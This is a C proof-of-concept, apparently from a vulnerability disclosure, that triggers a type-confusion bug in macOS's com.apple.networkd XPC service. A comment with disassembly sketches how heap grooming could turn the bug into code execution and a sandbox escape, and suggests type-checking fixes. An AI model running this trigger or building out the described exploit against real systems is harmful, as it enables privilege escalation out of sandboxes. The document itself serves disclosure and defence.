// clang -o networkd_poc networkd_poc.c -framework CoreFoundation

/*
com.apple.networkd is an xpc service reachable from many OS X sandboxes (via (system-network).)

It runs unsandboxed but as the user _networkd, this doesn't prevent it from being a valid sandbox escape as getting code execution
as _networkd gives access to a much bigger kernel attack surface.

The com.apple.networkd service parses many very complicated xpc messages and there are multiple type confusions bugs.

This PoC is a trigger for one of them which I'm pretty sure can actually be exploited to get code execution:

(_networkd has no symbols so these functions names are the offsets from the _networkd binary on 10.9.4)

__text:0000000100007421 sub_10000742
...
__text:00000001000074BD                 call    _xpc_array_get_value    ; return value not type-checked
__text:00000001000074C2                 mov     rdi, rax
__text:00000001000074C5                 call    sub_1000072CE           ; passed as first arg to sub_1000072CE


__text:00000001000072CE sub_1000072CE
...
__text:00000001000072F7                 lea     rax, off_100017668         ; "connect_by"
__text:00000001000072FE                 mov     rsi, [rax]
__text:0000000100007301                 call    _xpc_dictionary_get_uint64 ; rdi has never been checked to be an xpc dictionary
...
__text:00000001000073B7                 cmp     rax, 3                     ; if "connect_by" == 3
__text:00000001000073BB                 jnz     short loc_100007401
__text:00000001000073BD                 mov     [rbp+var_80], 0
__text:00000001000073C5                 lea     rax, off_100017768         ; "sockaddr"
__text:00000001000073CC                 mov     rsi, [rax]
__text:00000001000073CF                 lea     rdx, [rbp+var_80]
__text:00000001000073D3                 mov     rdi, rbx
__text:00000001000073D6                 call    _xpc_dictionary_get_data   ; same rdi, not checked to be a dictionary

xpc_dictionary_get_data will look up the key "sockaddr", check that the value matching that key is an OS_xpc_data object and then call
xpc_data_get_bytes_pointer. By crafting a fake xpc_dictionary (for example by passing an xpc_int64 as the value in the array then grooming
controlled data where the dictionary expects to find its hash bucket pointers) we can gain complete control of this xpc_data pointer (and
are also able to set the type field correctly.)

xpc_data_get_bytes_pointer will call xpc_map_data_once which will pass the pointer at offset +0x30 of the fake xpc_data object to dispatch_data_create_map
and then dispatch_release. By crafting this dispatch object such that it can't be correctly mapped (by setting +0x28 to 0) this dispatch object won't be retained
such that when it's passed to disptach_release (with the retain count set to 0) it will be released and an objective-c method will be invoked.

Actually doing that heap grooming is a pain, but I'm quite sure it's possible.

Many xpc services seem to suffer similar problems all stemming from the use of xpc_dictionary_get_value and xpc_array_get_value. This class of bug
could be eliminated by enforcing type checks in all APIs which expect a certain xpc type. Leaving type checking up to the programmer inevitably leads to trouble!

There are many other cases of this bug class in _networkd and other system daemons and services, I'd suggest grepping for xpc_dictionary_get_value and xpc_array_get_value
and checking how the return value is used. It will be much easier to work out what's going on and how to trigger them with the source!
*/

#include <stdio.h>
#include <stdlib.h>

#include <xpc/xpc.h>
#include <CoreFoundation/CoreFoundation.h>


int main(){
  xpc_connection_t conn = xpc_connection_create_mach_service("com.apple.networkd", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

  xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
    xpc_type_t t = xpc_get_type(event);
    if (t == XPC_TYPE_ERROR){
      printf("err: %s\n", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));
    }
    printf("received an event\n");
  });
  xpc_connection_resume(conn);

  xpc_object_t msg;
  xpc_object_t reply; 

  msg = xpc_dictionary_create(NULL, NULL, 0);
  xpc_dictionary_set_uint64(msg, "type", 6);
  xpc_dictionary_set_uint64(msg, "connection_id", 1);

  xpc_object_t params = xpc_dictionary_create(NULL, NULL, 0);
  xpc_object_t conn_list = xpc_array_create(NULL, 0);
  
  xpc_object_t arr_dict = xpc_dictionary_create(NULL, NULL, 0);
  xpc_dictionary_set_string(arr_dict, "hostname", "example.com");

  xpc_array_append_value(conn_list, arr_dict);

  /* this will be interpreted as an xpc dictionary */
  xpc_array_append_value(conn_list, xpc_string_create("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"));

  xpc_dictionary_set_value(params, "connection_entry_list", conn_list);
  xpc_dictionary_set_uint64(params, "start", 0);
  xpc_dictionary_set_uint64(params, "duration", 0);
  
  xpc_dictionary_set_value(msg, "parameters", params);

  xpc_object_t state = xpc_dictionary_create(NULL, NULL, 0);
  xpc_dictionary_set_int64(state, "power_slot", 0);
  xpc_dictionary_set_value(msg, "state", state);


  reply = xpc_connection_send_message_with_reply_sync(conn, msg);
  xpc_release(msg);
  xpc_release(msg);

  for(;;){
    CFRunLoopRunInMode(kCFRunLoopDefaultMode, DBL_MAX, TRUE);
  }
  return 0;
}
